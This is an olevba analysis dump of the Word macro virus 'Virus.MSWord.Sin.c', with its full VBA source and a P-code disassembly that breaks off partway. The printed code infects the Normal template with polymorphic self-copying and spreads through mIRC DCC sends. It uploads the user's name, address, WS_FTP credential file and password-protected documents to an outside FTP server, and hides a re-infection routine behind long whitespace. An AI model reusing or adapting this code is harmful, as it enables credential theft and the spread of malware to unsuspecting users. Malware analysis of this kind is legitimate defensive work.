olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Sin.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Sin.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
FHUSKIXUBSB:  Options.SaveNormalPrompt = False
GMUPAVB:  Randomize Timer
SMPLUULM:  LordArz = "Technological Illusions"
OOOOOO = UUUUUU
CFUTJHUEDFO:  NormInstalled = False
WEXYEXFSEF:  ActInstalled = False
WWLEASRN:  Set ActCarrier = ActiveDocument.VBProject.VBComponents(1).CodeModule
P = II
FTHPOBOK:  Set NormCarrier = NormalTemplate.VBProject.VBComponents(1).CodeModule
MUAVFYVTLP:
FOUAVMSNNUA:  NI = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(2, 1)
DKHRQWTMY:  AI = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(2, 1)
GBFSIOFIEK:
YIOYNCKGJRK:  If UCase(NI) = "ON ERROR RESUME NEXT" Then NormInstalled = True
VVGHWNDVNRP:  If UCase(AI) = "ON ERROR RESUME NEXT" Then ActInstalled = True
FLNGWGMF:
YGKRRUA:  If NormInstalled = False Then
CXLBDBWTKFR:      Set Infection = NormCarrier
MYXEQPOR:      Set Carrier = ActCarrier
MMM = WWW
RYOLEK:  Else
YFHSPSPGOJ:      Set Infection = ActCarrier
CDLDJGIYU:      Set Carrier = NormCarrier
KPUNGOUGIE:  End If
LBNVPIRNG:
ECBMAUO:
GNTIWQIGMVB:
TVVYFXCQFKS:  DoEvents
WWWWW = RRR
NESQKHFD:
OCVIRI:  Close
RJQONLUA:  Tr1 = Dir(CurDir & "\script.ini", vbNormal)
YAKWQOFDH:  Tr2 = UCase(Right(CurDir, 8))
PPPPPP = OOOOOO
DPMTMCQAYH:  Tr3 = Dir("C" & Chr(58) & "\MIRC", vbDirectory)
CKYPUICTVV:
DDDDDD = MMMMMM
TXRMBWKVVC:  If Tr1 <> "" Then SDir = CurDir & "\script.ini"
DMXARFM:  If Tr2 = "DOWNLOAD" Then SDir = CurDir & "\..\Script.ini"
KENUEHFST:  If Tr3 <> "" Then SDir = "C" & Chr(58) & "\MIRC\Script.ini"
GGIWCFLSD:
PARODYH:  If SDir <> "" Then
WUOMMQKHFL:      Open SDir For Output As #1
SVIHHCB:      Print #1, "n0=on 1" & Chr(59) & "JOIN" & Chr(59) & "#" & Chr(59) & "if ( $me != $nick ) { /dcc send $nick " & ThisDocument.FullName & " }"
AMKUMTXORTJ:      Close #1
SKNHHL:  End If
NJWTRAXB:  DoEvents
VAWAQJWDEJJ:
QCBODS:  WinPath = Environ("WINDIR")
JJ = VV
AHHCQOX:
KORWJNJKEG:  If Application.Tasks.Exists("Sockets Window") = True And System.PrivateProfileString("", "HKEY_CURRENT_USER\Software", "") = "" Then
YFHFSE:      With Application.FileSearch
CCCC = RRR
AJYKITXFW:              .FileName = "WS_FTP.ini"
OPXVWA:              .LookIn = "C" & Chr(58) & "\"
BWRIOEHGVJV:              .SearchSubFolders = True
SQRVFIKLGW:              .MatchTextExactly = True
ACHSWBVWEHJ:              .FileType = msoFileTypeAllFiles
QDNMXADLHKM:              .Execute
QNKFPOYU:              WsPath = .FoundFiles(1)
QQKGGS:      End With
AMSFWLF:
QHXFRK:      DoEvents
QBXXVQV:
RPMUYO:      If ActiveDocument.HasPassword = True Then BCK = True
GKYFAL:
MPDAGG:      DoEvents
LPFAVEMQW:      Open WinPath & "\" & Application.UserName & ".dat" For Output As #10
JWILUVRD:      Print #10, Application.UserName
K = PP
DVEWYTD:      Print #10, Application.UserAddress
ICPAJP:      If BCK = True Then Print #10, ActiveDocument.FullName
HCKNQVQNT:      If WsPath <> "" Then Print #10, "WS_FTP"
XUSNYTXYPFR:      Close #10
PPPPPP = PPPPP
UGOCOVFE:      Open WinPath & "\Command.$$$" For Output As #8
VMHQLBVRQ:      Print #8, "o ftp.xoom.com"
CDGXMEQ:      Print #8, "User SingOfScream"
MMQUKVSIXHQ:      Print #8, "Pass DIG001"
CDCDTGSSV:      Print #8, "binary"
BBB = XXXXXX
CTKKXEVQSGC:      Print #8, "put " & Application.UserName & ".dat"
XFUYWRR:      If WsPath <> "" Then Print #8, "put " & WsPath
XEWXWR:      If BCK = True Then Print #8, "put " & ActiveDocument.FullName
BCTVRVNMG:          Print #8, "quit"
WCVRDJBGJJ:      Close
FUGILSRSHF:      Shell WinPath & "\FTP.exe -n -s:Command.$$$"
KUCANVEQ:      MsgBox "file sent"
JCXAAM:      System.PrivateProfileString("", "HKEY_CURRENT_USER\Software", "") = "Your PC is infected  (UP THE IRONS)"
JBYUHEAUF:  End If
J = C
EXYILKMVPUB:  For x = 1 To ThisDocument.Variables.Count
AXQQAD:      ThisDocument.Variables(x).Delete
OOCOAHDILA:  Next x
CCVBAN:  For x = 1 To Normal.ThisDocument.Variables.Count
XFJLHQMCXSU:      Normal.ThisDocument.Variables(x).Delete
SGJWTGCT:  Next x
DLBENHV:
MFCBFVEGV:  With Carrier
LWTYQPYONIF:      UECode = .Lines(1, 2) & Chr(13)
RMITMPQVI:      For x = 5 To .CountOfLines - 1
UYREOPYWW:          VCCode = .Lines(x, 1)
VTYMDNJTYWQ:          If VCCode = "End Sub" Then Exit For
QWAQFEKR:          For i = 1 To 20
HDLYYSANCJF:              If Mid(VCCode, i, 1) = ":" Then VCCode = Right(VCCode, Len(VCCode) - i)
XAGFOL:          Next i
GETFOBVX:          factor = ""
HVMHSCL:          For Y = 1 To Int(Rnd * 6) + 6
SCHTEA:              factor = factor & Chr(Int(Rnd * 25) + 65)
RR = QQQ
ECEKIYTCXJ:          Next Y
MUMPYDRQ:          make_morph = factor & ": "
MMMM = RRRRR
BMIVXOBV:
NITSCY:          VirCode = VirCode & make_morph & " " & VCCode & Chr(13)
KPLLGTDJ:          If Int(Rnd * 10) > 7 Then VirCode = VirCode & String(Int(Rnd * 6) + 1, Chr(Int(Rnd * 25) + 65)) & " = " & String(Int(Rnd * 6) + 1, Chr(Int(Rnd * 25) + 65)) & Chr(13)
ELDEKLH:      Next x
ERPGEYFMMA:      VirCode = UECode & VirCode & "End Sub"
USMOAQ:  End With
OHQTRFHXHSE:
SJDVUDIF:  Normal.ThisDocument.Variables.Add "VCode", VirCode
NTOWHBUBRN:
RRR = OO
KJUBGAWEEKF:  ResetMe = "Private Sub Document_Close()" & Chr(13)
PWAMNEJAK:  ResetMe = ResetMe & String(150, Chr(9)) & "If ShowVisualBasicEditor= true then exit sub: With ThisDocument.VBProject.VBComponents(1).CodeModule: .DeleteLines 1, .CountOfLines: .InsertLines 1, Normal.ThisDocument.Variables(1).Value: End With: ThisDocument.Save" & Chr(13)
PNQBHAVVVW:  ResetMe = ResetMe & "End Sub"
VTSBFEIGWN:
VKQLDUW:  With ActCarrier
VQBBOSHCF:          .DeleteLines 1, .CountOfLines
NNYBEJHNMSU:          .InsertLines 1, ResetMe
SESBCFNH:  End With
YHUWHC:
XTAFEAIIY:  With NormCarrier
ORHRVQDYVPV:      .DeleteLines 1, .CountOfLines
IMNXTSG:      .InsertLines 1, ResetMe
WYEMOHMC:  End With
CYFQWU:
NN = DDDDDD
BPBLNVWOJ:  ActiveDocument.Save
HH = YYY
OBMFTXIDVL:  NormalTemplate.Save
End Sub
-------------------------------------------------------------------------------
VBA MACRO Modul1.bas 
in file: Virus.MSWord.Sin.c - OLE stream: 'Macros/VBA/Modul1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
    MsgBox "No Netbus server found in the memory"
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Sin.c
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 14057 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	Label FHUSKIXUBSB 
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #3:
' 	Label GMUPAVB 
' 	Ld Timer 
' 	ArgsCall Read 0x0001 
' Line #4:
' 	Label SMPLUULM 
' 	LitStr 0x0017 "Technological Illusions"
' 	St LordArz 
' Line #5:
' 	Ld UUUUUU 
' 	St OOOOOO 
' Line #6:
' 	Label CFUTJHUEDFO 
' 	LitVarSpecial (False)
' 	St NormInstalled 
' Line #7:
' 	Label WEXYEXFSEF 
' 	LitVarSpecial (False)
' 	St ActInstalled 
' Line #8:
' 	Label WWLEASRN 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set ActCarrier 
' Line #9:
' 	Ld II 
' 	St P 
' Line #10:
' 	Label FTHPOBOK 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set NormCarrier 
' Line #11:
' 	Label MUAVFYVTLP 
' Line #12:
' 	Label FOUAVMSNNUA 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St NI 
' Line #13:
' 	Label DKHRQWTMY 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St AI 
' Line #14:
' 	Label GBFSIOFIEK 
' Line #15:
' 	Label YIOYNCKGJRK 
' 	Ld NI 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0014 "ON ERROR RESUME NEXT"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St NormInstalled 
' 	EndIf 
' Line #16:
' 	Label VVGHWNDVNRP 
' 	Ld AI 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0014 "ON ERROR RESUME NEXT"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St ActInstalled 
' 	EndIf 
' Line #17:
' 	Label FLNGWGMF 
' Line #18:
' 	Label YGKRRUA 
' 	Ld NormInstalled 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #19:
' 	Label CXLBDBWTKFR 
' 	SetStmt 
' 	Ld NormCarrier 
' 	Set Infection 
' Line #20:
' 	Label MYXEQPOR 
' 	SetStmt 
' 	Ld ActCarrier 
' 	Set Carrier 
' Line #21:
' 	Ld WWW 
' 	St MMM 
' Line #22:
' 	Label RYOLEK 
' 	ElseBlock 
' Line #23:
' 	Label YFHSPSPGOJ 
' 	SetStmt 
' 	Ld ActCarrier 
' 	Set Infection 
' Line #24:
' 	Label CDLDJGIYU 
' 	SetStmt 
' 	Ld NormCarrier 
' 	Set Carrier 
' Line #25:
' 	Label KPUNGOUGIE 
' 	EndIfBlock 
' Line #26:
' 	Label LBNVPIRNG 
' Line #27:
' 	Label ECBMAUO 
' Line #28:
' 	Label GNTIWQIGMVB 
' Line #29:
' 	Label TVVYFXCQFKS 
' 	ArgsCall DoEvents 0x0000 
' Line #30:
' 	Ld RRR 
' 	St WWWWW 
' Line #31:
' 	Label NESQKHFD 
' Line #32:
' 	Label OCVIRI 
' 	CloseAll 
' Line #33:
' 	Label RJQONLUA 
' 	Ld CurDir 
' 	LitStr 0x000B "\script.ini"
' 	Concat 
' 	Ld vbNormal 
' 	ArgsLd Dir 0x0002 
' 	St Tr1 
' Line #34:
' 	Label YAKWQOFDH 
' 	Ld CurDir 
' 	LitDI2 0x0008 
' 	ArgsLd Right 0x0002 
' 	ArgsLd UCase 0x0001 
' 	St Tr2 
' Line #35:
' 	Ld OOOOOO 
' 	St PPPPPP 
' Line #36:
' 	Label DPMTMCQAYH 
' 	LitStr 0x0001 "C"
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0005 "\MIRC"
' 	Concat 
' 	Ld vbDirectory 
' 	ArgsLd Dir 0x0002 
' 	St Tr3 
' Line #37:
' 	Label CKYPUICTVV 
' Line #38:
' 	Ld MMMMMM 
' 	St DDDDDD 
' Line #39:
' 	Label TXRMBWKVVC 
' 	Ld Tr1 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld CurDir 
' 	LitStr 0x000B "\script.ini"
' 	Concat 
' 	St SDir 
' 	EndIf 
' Line #40:
' 	Label DMXARFM 
' 	Ld Tr2 
' 	LitStr 0x0008 "DOWNLOAD"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld CurDir 
' 	LitStr 0x000E "\..\Script.ini"
' 	Concat 
' 	St SDir 
' 	EndIf 
' Line #41:
' 	Label KENUEHFST 
' 	Ld Tr3 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "C"
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0010 "\MIRC\Script.ini"
' 	Concat 
' 	St SDir 
' 	EndIf 
' Line #42:
' 	Label GGIWCFLSD 
' Line #43:
' 	Label PARODYH 
' 	Ld SDir 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #44:
' 	Label WUOMMQKHFL 
' 	Ld SDir 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #45:
' 	Label SVIHHCB 
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "n0=on 1"
' 	LitDI2 0x003B 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0004 "JOIN"
' 	Concat 
' 	LitDI2 0x003B 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 "#"
' 	Concat 
' 	LitDI2 0x003B 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0026 "if ( $me != $nick ) { /dcc send $nick "
' 	Concat 
' 	Ld ThisDocument 
' 	MemLd FullName 
' 	Concat 
' 	LitStr 0x0002 " }"
' 	Concat 
' 	PrintItemNL 
' Line #46:
' 	Label AMKUMTXORTJ 
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #47:
' 	Label SKNHHL 
' 	EndIfBlock 
' Line #48:
' 	Label NJWTRAXB 
' 	ArgsCall DoEvents 0x0000 
' Line #49:
' 	Label VAWAQJWDEJJ 
' Line #50:
' 	Label QCBODS 
' 	LitStr 0x0006 "WINDIR"
' 	ArgsLd Environ 0x0001 
' 	St WinPath 
' Line #51:
' 	Ld VV 
' 	St JJ 
' Line #52:
' 	Label AHHCQOX 
' Line #53:
' 	Label KORWJNJKEG 
' 	LitStr 0x000E "Sockets Window"
' 	Ld Application 
' 	MemLd Tasks 
' 	ArgsMemLd Exists 0x0001 
' 	LitVarSpecial (True)
' 	Eq 
' 	LitStr 0x0000 ""
' 	LitStr 0x001A "HKEY_CURRENT_USER\Software"
' 	LitStr 0x0000 ""
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0000 ""
' 	Eq 
' 	And 
' 	IfBlock 
' Line #54:
' 	Label YFHFSE 
' 	StartWithExpr 
' 	Ld Application 
' 	MemLd FileSearch 
' 	With 
' Line #55:
' 	Ld RRR 
' 	St CCCC 
' Line #56:
' 	Label AJYKITXFW 
' 	LitStr 0x000A "WS_FTP.ini"
' 	MemStWith FileName 
' Line #57:
' 	Label OPXVWA 
' 	LitStr 0x0001 "C"
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	MemStWith LookIn 
' Line #58:
' 	Label BWRIOEHGVJV 
' 	LitVarSpecial (True)
' 	MemStWith SearchSubFolders 
' Line #59:
' 	Label SQRVFIKLGW 
' 	LitVarSpecial (True)
' 	MemStWith MatchTextExactly 
' Line #60:
' 	Label ACHSWBVWEHJ 
' 	Ld msoFileTypeAllFiles 
' 	MemStWith FileType 
' Line #61:
' 	Label QDNMXADLHKM 
' 	ArgsMemCallWith Execute 0x0000 
' Line #62:
' 	Label QNKFPOYU 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith FoundFiles 0x0001 
' 	St WsPath 
' Line #63:
' 	Label QQKGGS 
' 	EndWith 
' Line #64:
' 	Label AMSFWLF 
' Line #65:
' 	Label QHXFRK 
' 	ArgsCall DoEvents 0x0000 
' Line #66:
' 	Label QBXXVQV 
' Line #67:
' 	Label RPMUYO 
' 	Ld ActiveDocument 
' 	MemLd HasPassword 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St BCK 
' 	EndIf 
' Line #68:
' 	Label GKYFAL 
' Line #69:
' 	Label MPDAGG 
' 	ArgsCall DoEvents 0x0000 
' Line #70:
' 	Label LPFAVEMQW 
' 	Ld WinPath 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitStr 0x0004 ".dat"
' 	Concat 
' 	LitDI2 0x000A 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #71:
' 	Label JWILUVRD 
' 	LitDI2 0x000A 
' 	Sharp 
' 	PrintChan 
' 	Ld Application 
' 	MemLd UserName 
' 	PrintItemNL 
' Line #72:
' 	Ld PP 
' 	St K 
' Line #73:
' 	Label DVEWYTD 
' 	LitDI2 0x000A 
' 	Sharp 
' 	PrintChan 
' 	Ld Application 
' 	MemLd UserAddress 
' 	PrintItemNL 
' Line #74:
' 	Label ICPAJP 
' 	Ld BCK 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x000A 
' 	Sharp 
' 	PrintChan 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	PrintItemNL 
' 	EndIf 
' Line #75:
' 	Label HCKNQVQNT 
' 	Ld WsPath 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x000A 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "WS_FTP"
' 	PrintItemNL 
' 	EndIf 
' Line #76:
' 	Label XUSNYTXYPFR 
' 	LitDI2 0x000A 
' 	Sharp 
' 	Close 0x0001 
' Line #77:
' 	Ld PPPPP 
' 	St PPPPPP 
' Line #78:
' 	Label UGOCOVFE 
' 	Ld WinPath 
' 	LitStr 0x000C "\Command.$$$"
' 	Concat 
' 	LitDI2 0x0008 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #79:
' 	Label VMHQLBVRQ 
' 	LitDI2 0x0008 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "o ftp.xoom.com"
' 	PrintItemNL 
' Line #80:
' 	Label CDGXMEQ 
' 	LitDI2 0x0008 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0011 "User SingOfScream"
' 	PrintItemNL 
' Line #81:
' 	Label MMQUKVSIXHQ 
' 	LitDI2 0x0008 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "Pass DIG001"
' 	PrintItemNL 
' Line #82:
' 	Label CDCDTGSSV 
' 	LitDI2 0x0008 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "binary"
' 	PrintItemNL 
' Line #83:
' 	Ld XXXXXX 
' 	St BBB 
' Line #84:
' 	Label CTKKXEVQSGC 
' 	LitDI2 0x0008 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "put "
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitStr 0x0004 ".dat"
' 	Concat 
' 	PrintItemNL 
' Line #85:
' 	Label XFUYWRR 
' 	Ld WsPath 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0008 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "put "
' 	Ld WsPath 
' 	Concat 
' 	PrintItemNL 
' 	EndIf 
' Line #86:
' 	Label XEWXWR 
' 	Ld BCK 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0008 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "put "
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Concat 
' 	PrintItemNL 
' 	EndIf 
' Line #87:
' 	Label BCTVRVNMG 
' 	LitDI2 0x0008 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "quit"
' 	PrintItemNL 
' Line #88:
' 	Label WCVRDJBGJJ 
' 	CloseAll 
' Line #89:
' 	Label FUGILSRSHF 
' 	Ld WinPath 
' 	LitStr 0x001A "\FTP.exe -n -s:Command.$$$"
' 	Concat 
' 	ArgsCall Shell 0x0001 
' Line #90:
' 	Label KUCANVEQ 
' 	LitStr 0x0009 "file sent"
' 	ArgsCall MsgBox 0x0001 
' Line #91:
' 	Label JCXAAM 
' 	LitStr 0x0023 "Your PC is infected  (UP THE IRONS)"
' 	LitStr 0x0000 ""
' 	LitStr 0x001A "HKEY_CURRENT_USER\Software"
' 	LitStr 0x0000 ""
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #92:
' 	Label JBYUHEAUF 
' 	EndIfBlock 
' Line #93:
' 	Ld C 
' 	St J 
' Line #94:
' 	Label EXYILKMVPUB 
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd Variables 
' 	MemLd Count 
' 	For 
' Line #95:
' 	Label AXQQAD 
' 	Ld x 
' 	Ld ThisDocument 
' 	ArgsMemLd Variables 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #96:
' 	Label OOCOAHDILA 
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #97:
' 	Label CCVBAN 
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Normal 
' 	MemLd ThisDocument 
' 	MemLd Variables 
' 	MemLd Count 
' 	For 
' Line #98:
' 	Label XFJLHQMCXSU 
' 	Ld x 
' 	Ld Normal 
' 	MemLd ThisDocument 
' 	ArgsMemLd Variables 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #99:
' 	Label SGJWTGCT 
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #100:
' 	Label DLBENHV 
' Line #101:
' 	Label MFCBFVEGV 
' 	StartWithExpr 
' 	Ld Carrier 
' 	With 
' Line #102:
' 	Label LWTYQPYONIF 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	ArgsMemLdWith Lines 0x0002 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St UECode 
' Line #103:
' 	Label RMITMPQVI 
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0005 
' 	MemLdWith CountOfLines 
' 	LitDI2 0x0001 
' 	Sub 
' 	For 
' Line #104:
' 	Label UYREOPYWW 
' 	Ld x 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	St VCCode 
' Line #105:
' 	Label VTYMDNJTYWQ 
' 	Ld VCCode 
' 	LitStr 0x0007 "End Sub"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFor 
' 	EndIf 
' Line #106:
' 	Label QWAQFEKR 
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0014 
' 	For 
' Line #107:
' 	Label HDLYYSANCJF 
' 	Ld VCCode 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 ":"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld VCCode 
' 	Ld VCCode 
' 	FnLen 
' 	Ld i 
' 	Sub 
' 	ArgsLd Right 0x0002 
' 	St VCCode 
' 	EndIf 
' Line #108:
' 	Label XAGFOL 
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #109:
' 	Label GETFOBVX 
' 	LitStr 0x0000 ""
' 	St factor 
' Line #110:
' 	Label HVMHSCL 
' 	StartForVariable 
' 	Ld Y 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x0006 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0006 
' 	Add 
' 	For 
' Line #111:
' 	Label SCHTEA 
' 	Ld factor 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St factor 
' Line #112:
' 	Ld QQQ 
' 	St RR 
' Line #113:
' 	Label ECEKIYTCXJ 
' 	StartForVariable 
' 	Ld Y 
' 	EndForVariable 
' 	NextVar 
' Line #114:
' 	Label MUMPYDRQ 
' 	Ld factor 
' 	LitStr 0x0002 ": "
' 	Concat 
' 	St make_morph 
' Line #115:
' 	Ld RRRRR 
' 	St MMMM 
' Line #116:
' 	Label BMIVXOBV 
' Line #117:
' 	Label NITSCY 
' 	Ld VirCode 
' 	Ld make_morph 
' 	Concat 
' 	LitStr 0x0001 " "
' 	Concat 
' 	Ld VCCode 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St VirCode 
' Line #118:
' 	Label KPLLGTDJ 
' 	Ld Rnd 
' 	LitDI2 0x000A 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0007 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld VirCode 
' 	Ld Rnd 
' 	LitDI2 0x0006 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	ArgsLd String$ 0x0002 
' 	Concat 
' 	LitStr 0x0003 " = "
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0006 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	ArgsLd String$ 0x0002 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St VirCode 
' 	EndIf 
' Line #119:
' 	Label ELDEKLH 
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #120:
' 	Label ERPGEYFMMA 
' 	Ld UECode 
' 	Ld VirCode 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	St VirCode 
' Line #121:
' 	Label USMOAQ 
' 	EndWith 
' Line #122:
' 	Label OHQTRFHXHSE 
' Line #123:
' 	Label SJDVUDIF 
' 	LitStr 0x0005 "VCode"
' 	Ld VirCode 
' 	Ld Normal 
' 	MemLd ThisDocument 
' 	MemLd Variables 
' 	ArgsMemCall Add 0x0002 
' Line #124:
' 	Label NTOWHBUBRN 
' Line #125:
' 	Ld OO 
' 	St RRR 
' Line #126:
' 	Label KJUBGAWEEKF 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St ResetMe 
' Line #127:
' 	Label PWAMNEJAK 
' 	Ld ResetMe 
' 	LitDI2 0x0096 
' 	LitDI2 0x0009 
' 	ArgsLd Chr 0x0001 
' 	ArgsLd String$ 0x0002 
' 	Concat 
' 	LitStr 0x00D8 "If ShowVisualBasicEditor= true then exit sub: With ThisDocument.VBProject.VBComponents(1).CodeModule: .DeleteLines 1, .CountOfLines: .InsertLines 1, Normal.ThisDocument.Variables(1).Value: End With: ThisDocument.Save"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St ResetMe 
' Line #128:
' 	Label PNQBHAVVVW 
' 	Ld ResetMe 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	St ResetMe 
' Line #129:
' 	Label VTSBFEIGWN 
' Line #130:
' 	Label VKQLDUW 
' 	StartWithExpr 
' 	Ld ActCarrier 
' 	With 
' Line #131:
' 	Label VQBBOSHCF 
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #132:
' 	Label NNYBEJHNMSU 
' 	LitDI2 0x0001 
' 	Ld ResetMe 
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #133:
' 	Label SESBCFNH 
' 	EndWith 
' Line #134:
' 	Label YHUWHC 
' Line #135:
' 	Label XTAFEAIIY 
' 	StartWithExpr 
' 	Ld NormCarrier 
' 	With 
' Line #136:
' 	Label ORHRVQDYVPV 
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #137:
